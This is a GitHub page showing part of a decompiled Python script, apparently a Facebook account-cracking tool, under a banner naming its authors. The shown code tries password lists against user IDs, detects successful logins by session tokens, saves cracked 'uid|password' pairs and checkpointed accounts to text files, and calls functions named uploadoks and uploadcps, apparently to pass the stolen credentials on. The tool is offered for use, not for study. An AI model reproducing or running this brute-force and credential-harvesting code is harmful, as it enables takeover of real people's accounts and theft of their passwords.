...
Security
Insights
DECOMPILED-XD/avvera_dec.py
@SHANKAR-XD
SHANKAR-XD Add files via upload
 1 contributor
515 lines (471 sloc)  19.2 KB
W = '\033[97;1m' 
R = '\033[91;1m' 
G = '\033[92;1m' 
Y = '\033[93;1m' 
...
╚═╝     ╚═╝ ╚═════╝ ╚═════╝ ╚═╝    ╚═╝                                         
\033[1;90m═══════════════════════════════════════════════════════════
\033[1;94m [\033[1;94m✯\033[1;91m] \033[1;92mFACEBOOK : MOBEEN KHAN
\033[1;95m [\033[1;94m✯\033[1;91m] \033[1;92mFB GROUP : NAHI RAKHTA
\033[1;93m [\033[1;94m✯\033[1;91m] \033[1;92mGITHUB   : USE NAHI KRTA
\033[1;97m [\033[1;94m✯\033[1;91m] \033[1;92mWARNING  : FUCK U BABY 🍼🐥
\033[1;90m═══════════════════════════════════════════════════════════
    """)
	...
	def api(self, uid, pwx):
		...
		sys.stdout.write(
			"\r\r %s[>_] [MOBI] : %s/%s -> \033[0;92m [ MOBI-OK:%s ]- \033[0;91m[MOBI-CP:%s ]"%(B,self.loop, len(self.id), len(self.ok), len(self.cp))
		); sys.stdout.flush()
		for pw in pwx:
			pw = pw.lower()
			...
			if "session_key" in response.text and "EAAA" in response.text:
				print("\r \033[0;92m[MOBI-OK] %s|%s\033[0;97m         "%(uid, pw))
				self.ok.append("%s|%s"%(uid, pw))
				open("ok.txt","a").write(" [MOBI-OK] %s|%s\n"%(uid, pw))
				uploadoks()
				break
			elif "www.facebook.com" in response.json()["error_msg"]:
				print("\r \033[0;91m[MOBI-CP] %s|%s\033[0;97m         "%(uid, pw))
				self.cp.append("%s|%s"%(uid, pw))
				open("cp.txt","a").write(" [MOBI-CP] %s|%s\n"%(uid, pw))
				uploadcps()
				break
			else:
				continue
